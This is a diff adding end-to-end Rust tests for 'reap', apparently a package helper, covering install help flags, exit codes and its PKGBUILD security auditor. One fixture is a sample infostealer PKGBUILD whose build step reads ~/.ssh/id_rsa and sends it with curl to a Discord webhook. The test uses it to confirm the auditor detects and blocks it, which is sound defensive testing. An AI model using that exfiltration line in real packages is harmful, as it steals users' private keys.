@@ -96,6 +96,57 @@ fn test_cli_install_without_pkg() {
     );
 }
 
+#[test]
+fn test_cli_install_help_plan_flags() {
+    let (stdout, stderr, success) = run_reap(&["install", "--help"]);
+    assert!(success, "install --help should succeed. stderr: {}", stderr);
+    assert!(
+        stdout.contains("--dry-run"),
+        "install help should mention --dry-run. stdout: {}",
+        stdout
+    );
+    assert!(
+        stdout.contains("--noconfirm"),
+        "install help should mention --noconfirm. stdout: {}",
+        stdout
+    );
+    assert!(
+        stdout.contains("--skipreview"),
+        "install help should mention --skipreview. stdout: {}",
+        stdout
+    );
+    assert!(
+        stdout.contains("--strict"),
+        "install help should mention --strict. stdout: {}",
+        stdout
+    );
+}
+
+#[test]
+fn test_cli_batch_install_help_plan_flags() {
+    let (stdout, stderr, success) = run_reap(&["batch-install", "--help"]);
+    assert!(
+        success,
+        "batch-install --help should succeed. stderr: {}",
+        stderr
+    );
+    assert!(
+        stdout.contains("--dry-run"),
+        "batch-install help should mention --dry-run. stdout: {}",
+        stdout
+    );
+    assert!(
+        stdout.contains("--noconfirm"),
+        "batch-install help should mention --noconfirm. stdout: {}",
+        stdout
+    );
+    assert!(
+        stdout.contains("--skipreview"),
+        "batch-install help should mention --skipreview. stdout: {}",
+        stdout
+    );
+}
+
 // =============================================================================
 // Config Tests
 // =============================================================================
@@ -375,6 +426,80 @@ fn test_cli_security_stats() {
         "security stats should succeed or show security info. success: {}, output: {}",
         success,
         output
+    );
+}
+
+/// Write `contents` to a unique temp PKGBUILD, run `reap security audit` against
+/// the file, and return the combined output. The temp file is always removed
+/// before this returns, so callers can assert freely afterwards.
+fn audit_local_pkgbuild(tag: &str, contents: &str) -> String {
+    let path = std::env::temp_dir().join(format!(
+        "reap-e2e-audit-{}-{}.PKGBUILD",
+        std::process::id(),
+        tag
+    ));
+    std::fs::write(&path, contents).expect("write temp PKGBUILD");
+    let (stdout, stderr, _) = run_reap(&["security", "audit", path.to_str().unwrap()]);
+    let _ = std::fs::remove_file(&path);
+    format!("{}{}", stdout, stderr)
+}
+
+#[test]
+fn test_cli_security_audit_local_infostealer_blocks() {
+    // Sensitive credential read correlated with network exfiltration → the
+    // engine should rate this high confidence and report a default block.
+    let pkgbuild = r#"
+pkgname=evil
+build() {
+  data=$(cat ~/.ssh/id_rsa)
+  curl -X POST --data "$data" https://discord.com/api/webhooks/123/abc
+}
+"#;
+    let output = audit_local_pkgbuild("stealer", pkgbuild).to_lowercase();
+    assert!(
+        output.contains("infostealer confidence: high"),
+        "expected high infostealer confidence, got: {output}"
+    );
+    assert!(
+        output.contains("blocked"),
+        "expected a block notice, got: {output}"
+    );
+}
+
+#[test]
+fn test_cli_security_audit_local_does_not_leak_secret() {
+    // The audit must never echo a secret it discovers back to the terminal.
+    let secret = "AKIAIOSFODNN7EXAMPLE";
+    let pkgbuild = format!("pkgname=leaky\naws_key={secret}\n");
+    let output = audit_local_pkgbuild("secret", &pkgbuild);
+    assert!(
+        !output.contains(secret),
+        "audit output leaked the credential value: {output}"
+    );
+    assert!(
+        output.to_lowercase().contains("credential") || output.to_lowercase().contains("redacted"),
+        "expected a redacted credential finding, got: {output}"
+    );
+}
+
+#[test]
+fn test_cli_security_audit_local_clean_pkgbuild() {
+    let pkgbuild = r#"
+pkgname=hello
+pkgver=1.0
+source=("https://example.org/hello-1.0.tar.gz")
+sha256sums=('SKIP')
+build() { make; }
+package() { make DESTDIR="$pkgdir" install; }
+"#;
+    let output = audit_local_pkgbuild("clean", pkgbuild).to_lowercase();
+    assert!(
+        output.contains("infostealer confidence: none"),
+        "clean PKGBUILD should have no infostealer signal, got: {output}"
+    );
+    assert!(
+        !output.contains("blocked"),
+        "clean PKGBUILD should not be blocked, got: {output}"
     );
 }
 
@@ -756,5 +881,32 @@ fn test_cli_rollback_help() {
         stdout.contains("apply") || stdout.contains("Apply"),
         "rollback help should mention apply. stdout: {}",
         stdout
+    );
+}
+
+// =============================================================================
+// Exit-code propagation (P0.11)
+// =============================================================================
+
+#[test]
+fn test_cli_local_install_missing_file_exits_nonzero() {
+    // `reap local` on a missing artifact must fail *before* any pacman/sudo
+    // call (the file-existence check), so this is safe to run anywhere and
+    // deterministically exercises failure propagation to the process exit code.
+    let missing = format!(
+        "{}/reap-nonexistent-{}.pkg.tar.zst",
+        std::env::temp_dir().display(),
+        std::process::id()
+    );
+    let (stdout, stderr, success) = run_reap(&["local", &missing]);
+    assert!(
+        !success,
+        "local install of a missing file must exit nonzero. stdout: {}, stderr: {}",
+        stdout, stderr
+    );
+    assert!(
+        stderr.contains("does not exist"),
+        "should report the missing file. stderr: {}",
+        stderr
     );
 }
